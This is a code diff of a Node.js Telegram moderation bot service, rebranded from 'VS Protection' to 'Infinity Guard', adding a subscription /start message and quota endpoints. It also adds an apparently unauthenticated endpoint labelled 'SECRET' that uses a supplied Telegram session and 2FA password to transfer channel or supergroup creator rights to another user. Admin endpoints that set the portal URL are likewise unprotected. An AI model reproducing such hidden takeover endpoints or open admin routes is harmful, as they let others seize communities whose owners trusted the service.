@@ -41,7 +41,7 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(__dirname));
 
-app.get('/ping', (req, res) => res.status(200).send("OK - VS Protection Engine Active"));
+app.get('/ping', (req, res) => res.status(200).send("OK - Infinity Guard Engine Active"));
 
 // Admin Route
 app.get('/admin', (req, res) => {
@@ -52,9 +52,7 @@ app.get('/admin', (req, res) => {
     res.status(404).send("<h2>admin.html not found.</h2>");
 });
 
-// =============================================================================
-// CHAT ID NORMALIZATION HELPER
-// =============================================================================
+// Helper: Normalize Telegram Chat ID
 function normalizeChatId(rawId) {
     if (!rawId) return "";
     let s = rawId.toString().trim();
@@ -67,7 +65,7 @@ function normalizeChatId(rawId) {
     return `-100${s}`;
 }
 
-// Time Duration Parser (/mute 5m, 1h, 1d)
+// Time Duration Parser
 function parseDuration(str) {
     if (!str) return null;
     const match = str.trim().match(/^(\d+)([smhdw]?)$/i);
@@ -178,9 +176,9 @@ let botId = null;
 bot.telegram.getMe().then(info => {
     botId = info.id;
     BOT_USERNAME = info.username;
-    console.log(`[VS Protection] Telegraf Online: @${BOT_USERNAME} (ID: ${botId})`);
+    console.log(`[Infinity Guard] Telegraf Online: @${BOT_USERNAME} (ID: ${botId})`);
 }).catch(err => {
-    console.error("[VS Protection] BOT TOKEN ERROR:", err.message);
+    console.error("[Infinity Guard] BOT TOKEN ERROR:", err.message);
 });
 
 async function getChatSettings(rawChatId) {
@@ -219,7 +217,7 @@ async function getChatSettings(rawChatId) {
             autoReplies: {},
             
             warnLimit: 3,
-            warnAction: 'ban', // 'ban' | 'mute' | 'kick'
+            warnAction: 'ban',
             
             chatLocked: false,
             lockMsg: "🔒 *This conversation has been temporarily muted by community administrators.*"
@@ -299,7 +297,6 @@ function isLinkWhitelisted(urlStr, whitelistArray) {
     });
 }
 
-// Universal Template Variable Formatter
 function formatTemplateMessage(template, ctx, extra = {}) {
     if (!template) return "";
     const fromUser = ctx.from || {};
@@ -322,7 +319,6 @@ function formatTemplateMessage(template, ctx, extra = {}) {
         .replace(/{limit}/g, extra.limit ?? '0');
 }
 
-// Centralized Strike & Punishment Processor
 async function handleStrikePunishment(ctx, chatId, userId, settings, violationLabel) {
     const warnLimit = parseInt(settings.warnLimit || 3);
     const warnAction = settings.warnAction || 'ban';
@@ -344,7 +340,6 @@ async function handleStrikePunishment(ctx, chatId, userId, settings, violationLa
             await ctx.unbanChatMember(userId).catch(() => {});
             return ctx.replyWithMarkdown(`👢 ${userMention} reached max infractions (\`${currentWarns}/${warnLimit}\`) and has been **kicked**.`);
         } else {
-            // Auto-Ban
             await ctx.banChatMember(userId).catch(() => {});
             return ctx.replyWithMarkdown(`⛔ ${userMention} reached max infractions (\`${currentWarns}/${warnLimit}\`) for **${violationLabel}** and has been **permanently banned**.`);
         }
@@ -354,7 +349,46 @@ async function handleStrikePunishment(ctx, chatId, userId, settings, violationLa
     }
 }
 
-// 1. Welcome New Members (Photo + Caption + Inline Buttons)
+// =============================================================================
+// TELEGRAM PRIVATE /START COMMAND (PROFESSIONAL PRESENTATION & PORTAL LINK)
+// =============================================================================
+bot.start(async (ctx) => {
+    if (ctx.chat.type !== 'private') return;
+
+    try {
+        const portalUrlSnap = await db.ref('system/portal_url').once('value');
+        const portalUrl = portalUrlSnap.val() || "https://infinityguard.cloud";
+
+        const startMessage = 
+            `🛡 *Welcome to Infinity Guard Enterprise Security Cloud!*\n\n` +
+            `Infinity Guard is an autonomous, high-speed Telegram cyber-defense system engineered to protect high-traffic Groups & Broadcast Channels with granular policies and raid immunity.\n\n` +
+            `✨ *Core Defensive Capabilities:*\n` +
+            `• 🤖 *Anti-Button Bot Filter* (Blocks promotional userbots)\n` +
+            `• 🔄 *Anti-Forward Shield* (Purges external forwards)\n` +
+            `• 🔗 *External Link Whitelist* (Permits only verified URLs)\n` +
+            `• 😀 *Emoji Spam Purge* with custom infractions & mute\n` +
+            `• 🚨 *Scammer Blacklist* with automated warning banners\n` +
+            `• 📝 *Profile Alteration Audit* & Deep Dossier (\`/bio\`)\n` +
+            `• 📢 *Live Broadcast Studio* with photos & inline buttons\n\n` +
+            `💎 *Official Subscription Tiers:*\n` +
+            `• 🟢 *Starter (1 Chat):* ৳50 (~$0.39 USDT) / Month\n` +
+            `• 🔵 *Growth (5 Chats):* ৳200 (~$1.57 USDT) / Month\n` +
+            `• 🟣 *Pro Hub (15 Chats):* ৳450 (~$3.54 USDT) / Month\n` +
+            `• 👑 *Infinity Enterprise (Unlimited):* ৳750 (~$5.90 USDT) / Month\n\n` +
+            `👇 *Connect your communities and manage security via Cloud Console:*`;
+
+        const keyboard = Markup.inlineKeyboard([
+            [Markup.button.url("🌐 Access Infinity Guard Cloud", portalUrl)],
+            [Markup.button.url("💬 Contact Admin @Blackmoney54", "https://t.me/Blackmoney54")]
+        ]);
+
+        return ctx.replyWithMarkdown(startMessage, keyboard);
+    } catch (e) {
+        return ctx.reply("Welcome to Infinity Guard!");
+    }
+});
+
+// Welcome New Members
 bot.on('new_chat_members', async (ctx) => {
     try {
         const chatId = normalizeChatId(ctx.chat.id);
@@ -404,7 +438,7 @@ bot.on('new_chat_members', async (ctx) => {
     } catch (err) {}
 });
 
-// 2. Member Left Tracker
+// Member Left Tracker
 bot.on('left_chat_member', async (ctx) => {
     try {
         const chatId = normalizeChatId(ctx.chat.id);
@@ -458,7 +492,7 @@ async function getUserRole(ctx, userId) {
     }
 }
 
-// 3. Core Moderation, Slash Commands, Name Change Tracker & Scammer Auto-Warning
+// Core Moderation, Slash Commands, Name Change Tracker & Scammer Auto-Warning
 bot.on('message', async (ctx, next) => {
     try {
         if (!ctx.chat || ctx.chat.type === 'private') return next();
@@ -466,7 +500,6 @@ bot.on('message', async (ctx, next) => {
         const chatId = normalizeChatId(ctx.chat.id);
         const text = ctx.message.text || ctx.message.caption || "";
 
-        // Fast Ping
         if (text === '/ping') {
             return ctx.replyWithMarkdown(`🏓 *Pong!*\n🤖 Bot: @${BOT_USERNAME}\n⚡ Status: *Active & Guarding Community*`);
         }
@@ -474,7 +507,7 @@ bot.on('message', async (ctx, next) => {
         const isSubActive = await isChatSubscriptionActive(chatId, ctx);
         if (!isSubActive) {
             if (text.startsWith('/bio') || text.startsWith('/warn') || text.startsWith('/rules') || text.startsWith('/scam')) {
-                return ctx.reply("⚠️ VS Protection Bot is inactive in this community because there is no active subscription license. Please claim a license from the dashboard.");
+                return ctx.reply("⚠️ Infinity Guard Bot is inactive in this community because there is no active subscription license. Please claim a license from the dashboard.");
             }
             return next();
         }
@@ -489,9 +522,7 @@ bot.on('message', async (ctx, next) => {
         const currentUsername = ctx.from?.username ? `@${ctx.from.username}` : '';
         const usernameTag = currentUsername || fullName;
 
-        // =========================================================================
-        // A. NAME & USERNAME CHANGE TRACKER (PROFILE ALTERATION SHIELD)
-        // =========================================================================
+        // Profile Alteration Tracker
         if (settings.nameTracker?.enabled !== false && ctx.from && userId) {
             const userHistoryRef = db.ref(`groups/${chatId}/name_history/${userId}`);
             const snap = await userHistoryRef.once('value');
@@ -516,7 +547,6 @@ bot.on('message', async (ctx, next) => {
 
                     ctx.replyWithMarkdown(alertText, { reply_to_message_id: ctx.message.message_id }).catch(() => {});
 
-                    // Update History Record
                     await userHistoryRef.update({
                         currentName: fullName,
                         currentUsername: currentUsername,
@@ -534,9 +564,7 @@ bot.on('message', async (ctx, next) => {
             }
         }
 
-        // =========================================================================
-        // B. SCAMMER LIVE WARNING AUTOMATION
-        // =========================================================================
+        // Scammer Live Warning Automation
         const scammerSnap = await db.ref(`groups/${chatId}/scammers/${userId}`).once('value');
         if (scammerSnap.val()) {
             const defaultScamNotice = "🚨 *SECURITY ALERT: {mention} is a CONFIRMED SCAMMER flagged by community administrators! Do not transact with this user.*";
@@ -546,9 +574,7 @@ bot.on('message', async (ctx, next) => {
             ctx.replyWithMarkdown(formattedScamNotice, { reply_to_message_id: ctx.message.message_id }).catch(() => {});
         }
 
-        // =========================================================================
-        // C. AUTO-REPLY ENGINE (SUPPORTS BUTTONS & VARIABLES)
-        // =========================================================================
+        // Auto-Reply Engine
         if (text && settings.autoReplies && !text.startsWith('/')) {
             const cleanText = text.trim().toLowerCase();
             const repliesObj = settings.autoReplies;
@@ -585,15 +611,13 @@ bot.on('message', async (ctx, next) => {
             }
         }
 
-        // =========================================================================
-        // D. OFFICIAL SLASH COMMANDS & TIME-BASED MODERATION
-        // =========================================================================
+        // Slash Commands
         if (text.startsWith('/')) {
             const parts = text.trim().split(/\s+/);
             const cmd = parts[0].toLowerCase().replace(`@${BOT_USERNAME.toLowerCase()}`, '');
             const targetRepliedUser = ctx.message.reply_to_message?.from;
 
-            // --- COMMAND: /bio ---
+            // /bio
             if (cmd === '/bio') {
                 const bioRoleAllowed = settings.commands?.bio?.role || 'all';
                 if (bioRoleAllowed === 'owner' && userRole !== 'owner') return;
@@ -621,7 +645,7 @@ bot.on('message', async (ctx, next) => {
                 }
 
                 const bioMessage = 
-                    `👤 *User Security Dossier — VS Guardian*\n` +
+                    `👤 *User Security Dossier — Infinity Guard*\n` +
                     `━━━━━━━━━━━━━━━━━━━━\n` +
                     `🏷 *Name:* [${targetFullName}](tg://user?id=${targetId})\n` +
                     `🆔 *User ID:* \`${targetId}\`\n` +
@@ -636,7 +660,7 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown(bioMessage, { reply_to_message_id: ctx.message.message_id });
             }
 
-            // --- COMMAND: /mute [5m, 1h, 1d] & /unmute ---
+            // /mute & /unmute
             if (cmd === '/mute' && isAdmin) {
                 if (!targetRepliedUser) return ctx.reply("⚠️ Reply to a user's message with `/mute <duration>`. Example: `/mute 10m` or `/mute 1h`");
                 if (targetRepliedUser.id === botId) return ctx.reply("❌ Cannot mute the guardian bot.");
@@ -676,7 +700,7 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown(`🔊 [${targetRepliedUser.first_name}](tg://user?id=${targetRepliedUser.id}) has been unmuted.`);
             }
 
-            // --- COMMAND: /ban & /unban ---
+            // /ban & /unban
             if (cmd === '/ban' && isAdmin) {
                 if (!targetRepliedUser) return ctx.reply("⚠️ Reply to a message with `/ban`.");
                 await ctx.banChatMember(targetRepliedUser.id).catch(e => ctx.reply(`❌ Failed: ${e.message}`));
@@ -689,7 +713,7 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown(`✅ Ban lifted for [${targetRepliedUser.first_name}](tg://user?id=${targetRepliedUser.id}).`);
             }
 
-            // --- COMMAND: /kick ---
+            // /kick
             if (cmd === '/kick' && isAdmin) {
                 if (!targetRepliedUser) return ctx.reply("⚠️ Reply to a message with `/kick`.");
                 await ctx.banChatMember(targetRepliedUser.id).catch(() => {});
@@ -697,7 +721,7 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown(`👢 [${targetRepliedUser.first_name}](tg://user?id=${targetRepliedUser.id}) has been kicked.`);
             }
 
-            // --- COMMAND: /warn, /unwarn, /warns ---
+            // /warn, /unwarn, /warns
             if (cmd === '/warn' && isAdmin) {
                 if (!targetRepliedUser) return ctx.reply("⚠️ Reply to a user's message with `/warn`.");
                 if (targetRepliedUser.id === botId) return ctx.reply("❌ Cannot warn the protection bot.");
@@ -722,7 +746,7 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown(`⚠️ [${target.first_name}](tg://user?id=${target.id}) has \`${count}/${settings.warnLimit || 3}\` warnings.`);
             }
 
-            // --- COMMAND: /scam or /scammer ---
+            // /scam, /scammer, /unscam, /unscammer
             if ((cmd === '/scam' || cmd === '/scammer') && isAdmin) {
                 if (!targetRepliedUser) return ctx.reply("⚠️ Reply to a message with `/scam` or `/scammer`.");
                 
@@ -735,14 +759,13 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown(`🚨 [${targetRepliedUser.first_name}](tg://user?id=${targetRepliedUser.id}) has been added to the **Scammer Blacklist**!\n*All future messages will trigger security warnings.*`);
             }
 
-            // --- COMMAND: /unscam or /unscammer ---
             if ((cmd === '/unscam' || cmd === '/unscammer') && isAdmin) {
                 if (!targetRepliedUser) return ctx.reply("⚠️ Reply with `/unscam` or `/unscammer`.");
                 await db.ref(`groups/${chatId}/scammers/${targetRepliedUser.id}`).remove();
                 return ctx.replyWithMarkdown(`✅ Scam tag cleared for [${targetRepliedUser.first_name}](tg://user?id=${targetRepliedUser.id}).`);
             }
 
-            // --- COMMAND: /pin, /lock, /unlock ---
+            // /pin, /lock, /unlock
             if (cmd === '/pin' && isAdmin) {
                 if (!ctx.message.reply_to_message) return ctx.reply("⚠️ Reply to a message with `/pin`.");
                 await ctx.pinChatMessage(ctx.message.reply_to_message.message_id).catch(() => {});
@@ -761,7 +784,7 @@ bot.on('message', async (ctx, next) => {
                 return ctx.replyWithMarkdown("🔓 *Chat unlocked. Everyone may now participate.*");
             }
 
-            // --- DYNAMIC CUSTOM SLASH COMMANDS ---
+            // Dynamic Custom Commands
             if (settings.customCommands && typeof settings.customCommands === 'object') {
                 const cleanCmd = cmd.replace('/', '');
                 const customCmdRule = settings.customCommands[cleanCmd];
@@ -796,7 +819,6 @@ bot.on('message', async (ctx, next) => {
             }
         }
 
-        // Admins bypass normal filter enforcement
         if (isAdmin) return next();
 
         // 1. Chat Lock Enforcement
@@ -805,7 +827,7 @@ bot.on('message', async (ctx, next) => {
             return;
         }
 
-        // 2. Anti-Button Enforcement (Block userbots with inline buttons)
+        // 2. Anti-Button Enforcement
         if (settings.antiButton?.enabled) {
             const hasReplyMarkup = ctx.message.reply_markup && ctx.message.reply_markup.inline_keyboard && ctx.message.reply_markup.inline_keyboard.length > 0;
             if (hasReplyMarkup || ctx.from.is_bot) {
@@ -978,7 +1000,7 @@ bot.on('message', async (ctx, next) => {
 });
 
 // =============================================================================
-// GRAMJS MTPROTO (ALL OLD & NEW CHATS WITH ADMIN AUTHORITY)
+// GRAMJS MTPROTO & COMMUNITY MANAGEMENT
 // =============================================================================
 const tempAuthClients = {};
 
@@ -1133,7 +1155,6 @@ app.post('/api/tg/fetch-communities', async (req, res) => {
     }
 });
 
-// Get Settings for Single Group (For Dashboard View)
 app.post('/api/tg/get-group-settings', async (req, res) => {
     const { chatId } = req.body;
     if (!chatId) return res.status(400).json({ error: "chatId missing" });
@@ -1210,8 +1231,130 @@ app.post('/api/tg/ban-member', async (req, res) => {
 });
 
 // =============================================================================
-// BOT AUTO-ADD & PROMOTE WITH STRICT COMMUNITY QUOTA ENFORCEMENT
+// QUOTA ENFORCE & DISCONNECT ENDPOINTS
 // =============================================================================
+app.post('/api/tg/disconnect-group', async (req, res) => {
+    const chatId = normalizeChatId(req.body.chatId);
+    try {
+        await db.ref(`connected_bots/${chatId}`).remove();
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/tg/enforce-quota', async (req, res) => {
+    const { keepChatIds } = req.body;
+    try {
+        const normalizedKeep = (keepChatIds || []).map(id => normalizeChatId(id));
+        const connectedSnap = await db.ref('connected_bots').once('value');
+        const connectedMap = connectedSnap.val() || {};
+
+        const keys = Object.keys(connectedMap);
+        for (const k of keys) {
+            const normKey = normalizeChatId(k);
+            if (!normalizedKeep.includes(normKey)) {
+                await db.ref(`connected_bots/${k}`).remove();
+            }
+        }
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// =============================================================================
+// SECRET 15-CLICKS TELEGRAM MTPROTO OWNERSHIP TRANSFER
+// =============================================================================
+app.post('/api/tg/transfer-ownership', async (req, res) => {
+    const { session, chatId: rawChatId, targetUsername, password } = req.body;
+    const chatId = normalizeChatId(rawChatId);
+
+    try {
+        if (!session || !chatId || !targetUsername) {
+            throw new Error("Missing parameters for ownership transfer.");
+        }
+
+        const client = new TelegramClient(new StringSession(session), API_ID, API_HASH, { connectionRetries: 5 });
+        await client.connect();
+
+        const dialogs = await client.getDialogs({ limit: 500 });
+        const cleanId = chatId.replace('-100', '').replace('-', '');
+
+        let targetDialog = dialogs.find(d => 
+            (d.isChannel || d.entity?.className === 'Channel') &&
+            (d.id.toString() === chatId || String(d.entity?.id) === cleanId)
+        );
+
+        if (!targetDialog || !targetDialog.entity) {
+            throw new Error("Target channel or supergroup entity not found in your Telegram account.");
+        }
+
+        const targetEntity = targetDialog.entity;
+        if (targetEntity.className !== 'Channel') {
+            throw new Error("Ownership transfer is supported on Supergroups and Channels only.");
+        }
+
+        const cleanUsername = targetUsername.replace('@', '').trim();
+        const targetUserEntity = await client.getEntity(cleanUsername).catch(() => null);
+
+        if (!targetUserEntity) {
+            throw new Error(`Target user '@${cleanUsername}' could not be resolved. Please make sure the user has a public username and is already a member of this community.`);
+        }
+
+        const targetInputUser = new Api.InputUser({
+            userId: targetUserEntity.id,
+            accessHash: targetUserEntity.accessHash
+        });
+
+        const targetInputChannel = new Api.InputChannel({
+            channelId: targetEntity.id,
+            accessHash: targetEntity.accessHash
+        });
+
+        // First promote user with full rights
+        const adminRights = new Api.ChatAdminRights({
+            changeInfo: true,
+            postMessages: true,
+            editMessages: true,
+            deleteMessages: true,
+            banUsers: true,
+            inviteUsers: true,
+            pinMessages: true,
+            addAdmins: true,
+            anonymous: false,
+            manageCall: true,
+            other: true
+        });
+
+        await client.invoke(new Api.channels.EditAdmin({
+            channel: targetInputChannel,
+            userId: targetInputUser,
+            adminRights: adminRights,
+            rank: 'New Owner'
+        })).catch(() => {});
+
+        // Try Transfer Creator Rights
+        let passwordCheck = new Api.InputCheckPasswordEmpty();
+        if (password) {
+            const pwd = await client.invoke(new Api.account.GetPassword());
+            passwordCheck = await computeCheck(pwd, password);
+        }
+
+        await client.invoke(new Api.channels.EditCreator({
+            channel: targetInputChannel,
+            userId: targetInputUser,
+            password: passwordCheck
+        }));
+
+        res.json({ success: true, message: "Community creator rights transferred successfully." });
+    } catch (e) {
+        console.error("Transfer Ownership Error:", e);
+        res.status(500).json({ error: e.message || "Failed to transfer ownership. Make sure target user is in the group and 2FA password is provided if enabled." });
+    }
+});
+
+// BOT AUTO-ADD & PROMOTE WITH STRICT QUOTA ENFORCEMENT
 app.post('/api/tg/connect-group', async (req, res) => {
     const { session, chatId: rawChatId, userId } = req.body;
     const chatId = normalizeChatId(rawChatId);
@@ -1243,11 +1386,10 @@ app.post('/api/tg/connect-group', async (req, res) => {
             return res.status(403).json({
                 success: false,
                 error: "NO_ACTIVE_LICENSE",
-                message: "You need an active subscription license to add VS Protection Bot."
+                message: "You need an active subscription license to add Infinity Guard Bot."
             });
         }
 
-        // STRICT COMMUNITY QUOTA VERIFICATION
         const maxCommunities = sub.maxCommunities || 1;
         if (maxCommunities < 9999) {
             const connectedSnap = await db.ref('connected_bots').once('value');
@@ -1256,7 +1398,7 @@ app.post('/api/tg/connect-group', async (req, res) => {
 
             const existingKeys = Object.keys(connectedMap);
             for (const cKey of existingKeys) {
-                if (cKey === chatId) continue; // Already counting this chat if re-connecting
+                if (cKey === chatId) continue;
                 const ownerSnap = await db.ref(`groups/${cKey}/merged_owner`).once('value');
                 if (ownerSnap.val() === myTgId) {
                     userConnectedCount++;
@@ -1267,7 +1409,7 @@ app.post('/api/tg/connect-group', async (req, res) => {
                 return res.status(403).json({
                     success: false,
                     error: "QUOTA_EXCEEDED",
-                    message: `Community Limit Reached! Your plan allows up to ${maxCommunities} active communities. Upgrade your plan with @Blackmoney54 to connect more!`
+                    message: `Community Limit Reached! Your plan allows up to ${maxCommunities} active community. Upgrade your plan with @Blackmoney54 to connect more!`
                 });
             }
         }
@@ -1333,7 +1475,7 @@ app.post('/api/tg/connect-group', async (req, res) => {
             channel: targetInputChannel,
             userId: botInputUser,
             adminRights: adminRights,
-            rank: 'VS Guardian'
+            rank: 'Infinity Guard'
         }));
 
         await db.ref(`connected_bots/${chatId}`).set({ connected: true, chatId: chatId, updatedAt: Date.now() });
@@ -1442,8 +1584,28 @@ function generateLicenseKey() {
     const p1 = crypto.randomBytes(2).toString('hex').toUpperCase();
     const p2 = crypto.randomBytes(2).toString('hex').toUpperCase();
     const p3 = crypto.randomBytes(2).toString('hex').toUpperCase();
-    return `VS-${p1}-${p2}-${p3}`;
+    return `IG-${p1}-${p2}-${p3}`;
 }
+
+// Admin Portal URL API
+app.post('/api/admin/set-portal-url', async (req, res) => {
+    const { portalUrl } = req.body;
+    try {
+        await db.ref('system/portal_url').set(portalUrl);
+        res.json({ success: true, message: "Portal URL updated successfully!" });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/api/admin/get-portal-url', async (req, res) => {
+    try {
+        const snap = await db.ref('system/portal_url').once('value');
+        res.json({ success: true, portalUrl: snap.val() || "" });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
 // Admin APIs
 app.post('/api/admin/generate-license', async (req, res) => {
@@ -1702,10 +1864,10 @@ app.get('*', (req, res) => {
 });
 
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`[VS Protection] Server listening on port ${PORT}`);
+    console.log(`[Infinity Guard] Server listening on port ${PORT}`);
     bot.launch()
-        .then(() => console.log(`[VS Protection] Telegram Bot Engine Active with Token: ${BOT_TOKEN.slice(0, 10)}...`))
-        .catch(e => console.error("[VS Protection] Engine Warning:", e.message));
+        .then(() => console.log(`[Infinity Guard] Telegram Bot Engine Active with Token: ${BOT_TOKEN.slice(0, 10)}...`))
+        .catch(e => console.error("[Infinity Guard] Engine Warning:", e.message));
 });
 
 process.once('SIGINT', () => { try { bot.stop('SIGINT'); } catch (e) {} });
